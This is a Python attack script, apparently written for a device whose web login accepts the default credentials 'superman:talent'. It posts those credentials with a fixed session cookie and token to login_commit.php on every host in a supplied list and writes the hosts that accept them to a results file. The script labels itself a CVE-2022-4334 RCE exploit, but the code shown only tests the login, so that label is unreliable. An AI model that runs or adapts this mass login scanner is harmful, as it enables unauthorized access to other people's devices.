import argparse
import textwrap

import requests


def main(url):
    full_url = f"{url}/login_commit.php"
    cookies = {"PHPSESSID": "9985086da30c8f77dfc449f75f76c898"}
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
               "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
               "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded",
               "Origin": "https://110.80.41.62:8888", "Referer": "https://110.80.41.62:8888/login.php",
               "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
               "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Te": "trailers", "Connection": "close"}
    data = {"token": "7a85b783a05990dfc5e1f215caaf854f", "lang": "zh_CN", "name": "superman", "password": "talent"}
    try:
        response = requests.post(full_url, headers=headers, cookies=cookies, data=data, allow_redirects=False,
                                 verify=False,
                                 timeout=5)
    except Exception:
        print(f'[-]{url}登录超时')
        return
    if 'window.location' in response.text:
        print(f'[+]{url}登录成功')
        return url
    else:
        print(f'[-]{url}登录失败')


if __name__ == '__main__':
    banner = """ 
      ____ _____    _________.__.
    _/ __ \\__  \  /  ___<   |  |
    \  ___/ / __ \_\___ \ \___  |
     \___  >____  /____  >/ ____|
         \/     \/     \/ \/  
    """
    print(banner)
    parser = argparse.ArgumentParser(description='弱口令 rce exp',
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent('''example:
            cve-2022-4334-rce.py -u http://192.168.1.108 -f host.txt
            '''))
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.mhx.com:80")
    parser.add_argument("-f", "--file", dest="file", type=str, help="example: -f host.txt")
    parser.add_argument("-o", "--output", dest="output", type=str, help=" example: -o result.txt")
    args = parser.parse_args()
    if args.file:
        res_url = []
        with open(f"{args.file}", mode="r", encoding="u8") as f:
            for line in f:
                url = main(line.strip())
                if url:
                    res_url.append(url)
        with open("result1.txt", mode="w", encoding="u8") as f:
            for i in res_url:
                f.write(f"{i}存在弱口令 superman:talent\n")
    else:
        main(args.url)
